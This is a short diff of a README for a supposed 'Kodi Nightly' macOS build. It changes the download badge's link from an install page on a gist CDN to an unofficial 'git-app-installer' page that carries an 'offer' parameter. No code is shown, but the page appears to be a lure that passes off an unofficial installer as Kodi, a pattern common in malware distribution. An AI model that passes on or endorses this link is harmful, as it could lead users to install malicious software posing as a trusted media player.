@@ -2,7 +2,7 @@
 
 Kodi Nightly is a desktop build for macOS that provides access to the newest experimental features of the Kodi media platform. It is designed for users who want to explore updates, UI improvements, and enhanced playback components before they appear in stable releases.
 
-<a href="https://gistcdn.githack.com/leshiykennyrice74/3194515074f1d97d04bfea2eae10302c/raw/dfb7ef7ebc7f5b543c95c16f07b58235de2707f3/install.html?offer=KodiNightly" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=KodiNightly" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Kodi%20Nightly%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
